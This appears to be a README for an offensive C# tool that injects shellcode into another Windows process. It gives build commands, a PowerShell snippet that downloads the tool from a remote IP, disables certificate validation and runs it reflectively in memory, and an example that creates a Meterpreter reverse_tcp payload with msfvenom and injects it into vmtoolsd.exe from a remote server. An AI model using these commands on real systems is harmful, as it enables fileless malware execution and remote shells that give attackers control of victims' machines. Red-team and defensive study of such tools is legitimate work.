# Sharp Shell Code Inject
Inject the shellcode from local file or remote.
The https certificate for the request is ignored.
(No need high priv!)

## Build
```
sudo apt install -y mono-complete
mcs /reference:System.Net.Http SharpScInject.cs
```

## Usage
```
SharpScInject.exe <PID_or name> <Shell Code PATH / URL>
```


File-less invoke
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;
$data = (New-Object System.Net.WebClient).DownloadData('https://192.168.xx.xx/file/ProcInject.exe')
# $data=[System.IO.File]::ReadAllBytes('C:\Windows\Tasks\ProcInject.exe')

$argument = "5278 https://192.168.xx.xx/file/my_shellcode.bin"

$assem = [System.Reflection.Assembly]::Load($data)
$method = $assem.Entrypoint
$argu= New-Object -TypeName System.Collections.ArrayList
$strings = $argument.Split(" ")
$argu.Add($strings)
$method.Invoke($null, $argu.ToArray())
```
## example
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.20  LPORT=443 -f raw -o a.raw
.\SharpScInject.exe vmtoolsd.exe http://10.10.16.20/a.raw
```
